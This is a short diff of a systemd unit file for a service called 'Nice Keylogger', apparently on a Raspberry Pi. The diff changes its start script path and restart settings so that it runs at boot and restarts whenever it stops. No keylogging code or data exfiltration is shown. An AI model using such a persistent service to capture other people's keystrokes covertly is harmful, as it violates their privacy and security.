@@ -1,14 +1,11 @@
 [Unit]
-Description=Nice Keylogger Service
-After=network.target
-StartLimitIntervalSec=0
+Description=Nice Keylogger
 
 [Service]
 Type=simple
 Restart=always
 RestartSec=1
-# TODO confirm this directory works
-ExecStart=~/nicekl/coordinator.sh
+ExecStart=/bin/bash /home/pi/nicekl/restart.sh
 
 [Install]
 WantedBy=multi-user.target
